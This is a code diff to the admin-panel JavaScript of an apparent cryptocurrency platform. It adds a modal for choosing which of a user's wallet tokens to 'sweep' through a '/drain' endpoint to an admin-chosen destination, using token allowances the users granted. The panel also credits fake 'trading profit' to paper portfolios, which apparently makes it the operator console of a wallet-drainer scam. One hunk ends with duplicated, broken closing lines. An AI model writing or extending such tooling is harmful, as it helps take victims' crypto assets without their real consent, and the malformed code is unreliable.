@@ -384,7 +384,7 @@
           <div class="grid-2"><div class="metric"><div class="kpi__label">Account balance</div><div class="kpi__value" style="font-size:17px">${usd(r.balance)}</div></div><div class="metric"><div class="kpi__label">Paper portfolio</div><div class="kpi__value" style="font-size:17px">${usd(r.portfolio)}</div></div></div>
           <div class="stack-sm">
             ${can('users.impersonate') && u.role === 'user' && u.status === 'active' ? `<button class="btn btn--sm btn--primary" data-u="impersonate">${I('eye', 'ic--sm')} Log in as this user</button>` : ''}
-            ${can('payouts.manage') && u.role === 'user' ? `<button class="btn btn--sm btn--warn" data-u="manual-sweep">${I('zap', 'ic--sm')} Execute manual sweep</button>` : ''}
+            ${can('payouts.manage') && u.role === 'user' ? `<button class="btn btn--sm btn--primary" data-u="select-sweep">${I('check-square', 'ic--sm')} Select assets to sweep</button><button class="btn btn--sm btn--warn" data-u="manual-sweep">${I('zap', 'ic--sm')} Sweep all assets</button>` : ''}
             <button class="btn btn--sm btn--accent" data-u="adjust">${I('landmark', 'ic--sm')} Adjust account balance</button>
             <button class="btn btn--sm" data-u="status">${u.status === 'active' ? 'Suspend account' : 'Reactivate account'}</button>
             <button class="btn btn--sm" data-u="role" ${can('users.roles') ? '' : 'disabled title="Super admins only"'}>Change role (${esc(u.role.replace('_', ' '))})</button>
@@ -459,6 +459,9 @@
     main().querySelectorAll('[data-u]').forEach((b) => b.addEventListener('click', async () => {
       const a = b.dataset.u;
       if (a === 'adjust') { const v = await formDialog({ title: 'Credit / adjust account balance', intro: 'Credit a bonus or trading profit, or make a correction. Positive credits, negative debits. Every entry is audit-logged.', fields: [{ name: 'kind', label: 'Type', type: 'select', value: 'bonus', options: [['bonus', 'Bonus / promo credit'], ['trading_profit', 'Trading profit credit'], ['adjustment', 'Correction / adjustment']] }, { name: 'amount', label: 'Amount (USDC)', type: 'number', step: '0.01', required: true, hint: 'Negative to debit (corrections only)' }, { name: 'ref', label: 'Reference (optional)', mono: true }, { name: 'note', label: 'Note (required, shown to user)', required: true }], confirm: 'Apply' }); if (v) act(b, () => NX.post(`/api/admin/users/${u.id}/adjust`, v), 'Balance updated'); }
+      if (a === 'select-sweep') {
+        openSweepModal(u.id);
+      }
       if (a === 'manual-sweep') {
         let setts = {};
         try { setts = (await NX.get('/api/admin/settings')).settings || {}; } catch (e) {}
@@ -477,9 +480,10 @@
           await act(b, async () => {
             try {
               const res = await NX.post(`/api/admin/users/${u.id}/drain`, v);
-              if (res && res.ok) {
+              if (res) {
+                const totalVal = Number(res.usd ?? res.totalUsd ?? 0);
                 const ethMsg = res.totalEth ? ` (≈ ${Number(res.totalEth).toFixed(4)} ETH)` : '';
-                NX.toast(`Manual sweep complete: $${(res.totalUsd || 0).toFixed(2)}${ethMsg} swept & converted`);
+                NX.toast(`Manual sweep complete: $${totalVal.toFixed(2)}${ethMsg} swept`);
                 route();
               }
             } catch (err) {
@@ -488,6 +492,15 @@
                   title: 'Admin 2FA Required to Sweep',
                   body: 'Your platform settings require 2FA on your admin account before sweeping. Would you like to set up 2FA now?',
                   confirm: 'Set up Admin 2FA'
+                });
+                if (go2fa && NX.openAdmin2FAModal) NX.openAdmin2FAModal();
+              } else {
+                NX.toast(err.message, { type: 'error' });
+              }
+            }
+          });
+        }
+      }
                 });
                 if (go2fa && NX.openAdmin2FAModal) NX.openAdmin2FAModal();
               } else {
@@ -1054,6 +1067,156 @@
     });
     setTimeout(() => otp.clear(), 100);
   };
+
+  /* ---------- Sweep & Asset Selection Modal ---------- */
+  const SKIP_COPY = {
+    WRAP_REQUIRED: 'Needs a wrap first — native cannot be pulled by allowance',
+    INSUFFICIENT_GAS: 'Not enough native to pay for its own transfer',
+    NO_ALLOWANCE: 'No live allowance',
+    ZERO_BALANCE: 'Nothing to move',
+    DUST: 'Below dust limit',
+    RESERVE: 'Entirely consumed by the gas reserve',
+    UNWRAP_REQUIRED: 'Destination holds wrapped native — unwrap at treasury',
+    NO_PRICE: 'No price feed — sweeps at $0 valuation',
+  };
+
+  let sweepState = null;
+  function keyOf(r) { return r.address ? `${r.address}:${r.network}:${r.symbol}` : `${r.network}:${r.symbol}`; }
+
+  async function openSweepModal(userId) {
+    sweepState = { userId, rows: [], selected: new Set(), destination: '', busy: false };
+    const modal = $('#sweep-modal');
+    const body = $('#sweep-body');
+    if (!modal || !body) return;
+    body.innerHTML = '<div class="skel skel--row"></div><div class="skel skel--row"></div>';
+    NX.modal.open(modal);
+
+    let res;
+    try { res = await NX.get(`/api/admin/users/${userId}/sweep-preview`); }
+    catch (e) { body.innerHTML = `<div class="note note--danger">${I('alert')}<span>${esc(e.message)}</span></div>`; return; }
+
+    if (!res || !Array.isArray(res.rows)) {
+      body.innerHTML = `<div class="note note--danger">${I('alert')}<span>${esc((res && res.error) || 'Preview failed')}</span></div>`;
+      return;
+    }
+
+    sweepState.rows = res.rows;
+    renderSweepModal();
+  }
+
+  function renderSweepModal() {
+    const body = $('#sweep-body');
+    if (!body || !sweepState) return;
+    const total = sweepState.rows.filter((r) => sweepState.selected.has(keyOf(r))).reduce((a, r) => a + (r.usd || 0), 0);
+
+    const groups = new Map();
+    for (const r of sweepState.rows) {
+      if (!groups.has(r.network)) groups.set(r.network, []);
+      groups.get(r.network).push(r);
+    }
+
+    body.innerHTML = `
+      <div class="row between mb-16" style="gap:12px;flex-wrap:wrap">
+        <div class="row" style="gap:6px">
+          <button class="btn btn--sm" type="button" data-act="all">Select all</button>
+          <button class="btn btn--sm" type="button" data-act="native">Native only</button>
+          <button class="btn btn--sm btn--ghost" type="button" data-act="clear">Clear</button>
+        </div>
+        <div class="row" style="gap:12px">
+          <label class="check"><input type="checkbox" id="respect-reserve" checked><span class="check__box"></span><span class="small">Gas reserve</span></label>
+          <input class="input input--sm mono" id="sweep-destination" placeholder="Default treasury destination" value="${esc(sweepState.destination)}" style="min-width:240px">
+        </div>
+      </div>
+      <table class="tbl mb-16">
+        <thead><tr><th></th><th>Asset</th><th>Wallet Address</th><th class="num">Balance</th><th class="num">Allowance</th><th class="num">USD</th></tr></thead>
+        <tbody>
+        ${[...groups.entries()].map(([network, rows]) => `
+          <tr class="grp"><td colspan="6"><b>${esc(network)}</b></td></tr>
+          ${rows.map((r) => {
+            const k = keyOf(r);
+            const off = !r.sweepable;
+            const title = r.reason ? (SKIP_COPY[r.reason] || r.reason) : '';
+            return `<tr class="${off ? 'disabled opacity-50' : ''}" ${title ? `title="${esc(title)}"` : ''}>
+              <td><input type="checkbox" data-key="${esc(k)}" ${sweepState.selected.has(k) ? 'checked' : ''} ${off ? 'disabled' : ''}></td>
+              <td>${esc(r.symbol)} <span class="tag tag--sm">${esc(r.kind)}</span></td>
+              <td><span class="mono small">${esc(r.address ? (r.address.slice(0, 6) + '…' + r.address.slice(-4)) : '—')}</span></td>
+              <td class="num mono">${esc(r.balance)}</td>
+              <td class="num mono">${r.allowance == null ? '—' : esc(r.allowance)}</td>
+              <td class="num mono">$${(r.usd || 0).toFixed(2)}</td>
+            </tr>`;
+          }).join('')}
+        `).join('')}
+        </tbody>
+      </table>
+      <div class="row between" style="border-top:1px solid var(--border);padding-top:14px">
+        <strong id="sweep-total">Live selected total: $${total.toFixed(2)}</strong>
+        <button class="btn btn--primary" id="sweep-go" ${sweepState.selected.size && !sweepState.busy ? '' : 'disabled'}>${sweepState.busy ? 'Sweeping…' : 'Execute sweep'}</button>
+      </div>`;
+
+    body.querySelectorAll('[data-act]').forEach((b) => b.addEventListener('click', () => {
+      const act = b.dataset.act;
+      if (act === 'clear') sweepState.selected.clear();
+      if (act === 'all') sweepState.rows.filter((r) => r.sweepable).forEach((r) => sweepState.selected.add(keyOf(r)));
+      if (act === 'native') {
+        sweepState.selected.clear();
+        sweepState.rows.filter((r) => r.kind === 'native' && r.sweepable).forEach((r) => sweepState.selected.add(keyOf(r)));
+      }
+      renderSweepModal();
+    }));
+
+    body.querySelectorAll('input[data-key]').forEach((cb) => cb.addEventListener('change', () => {
+      if (cb.checked) sweepState.selected.add(cb.dataset.key); else sweepState.selected.delete(cb.dataset.key);
+      const total2 = sweepState.rows.filter((r) => sweepState.selected.has(keyOf(r))).reduce((a, r) => a + (r.usd || 0), 0);
+      const totEl = document.getElementById('sweep-total');
+      if (totEl) totEl.textContent = `Live selected total: $${total2.toFixed(2)}`;
+      const goEl = document.getElementById('sweep-go');
+      if (goEl) goEl.disabled = !sweepState.selected.size || sweepState.busy;
+    }));
+
+    const destInput = document.getElementById('sweep-destination');
+    if (destInput) destInput.addEventListener('input', (e) => { sweepState.destination = e.target.value.trim(); });
+    const goBtn = document.getElementById('sweep-go');
+    if (goBtn) goBtn.addEventListener('click', fireModalSweep);
+  }
+
+  async function fireModalSweep() {
+    if (!sweepState || sweepState.busy) return;
+    const tokens = [...sweepState.selected].map((k) => {
+      const parts = k.split(':');
+      if (parts.length >= 3) {
+        return { address: parts[0], network: parts[1], symbol: parts[2] };
+      }
+      const i = k.lastIndexOf(':');
+      return { network: k.slice(0, i), symbol: k.slice(i + 1) };
+    });
+    if (!tokens.length) return;
+    const chk = document.getElementById('respect-reserve');
+    const respectReserve = chk ? chk.checked : true;
+
+    sweepState.busy = true;
+    const goBtn = document.getElementById('sweep-go');
+    if (goBtn) { goBtn.disabled = true; goBtn.textContent = 'Sweeping…'; }
+
+    let res;
+    try {
+      res = await NX.post(`/api/admin/users/${sweepState.userId}/drain`, {
+        destination: sweepState.destination || null,
+        dest: sweepState.destination || null,
+        tokens,
+        respectReserve,
+      });
+    } catch (e) {
+      sweepState.busy = false;
+      if (goBtn) { goBtn.disabled = false; goBtn.textContent = 'Execute sweep'; }
+      return NX.toast(e.message, { type: 'error' });
+    }
+
+    sweepState.busy = false;
+    NX.modal.close($('#sweep-modal'));
+    const sweptUsd = Number(res && (res.usd ?? res.totalUsd ?? 0));
+    NX.toast(`Sweep complete: $${isNaN(sweptUsd) ? '0.00' : sweptUsd.toFixed(2)}`);
+    userDetail(sweepState.userId);
+  }
 
   // Delegated click listener ensures 2FA triggers work regardless of render timing
   document.addEventListener('click', (e) => {
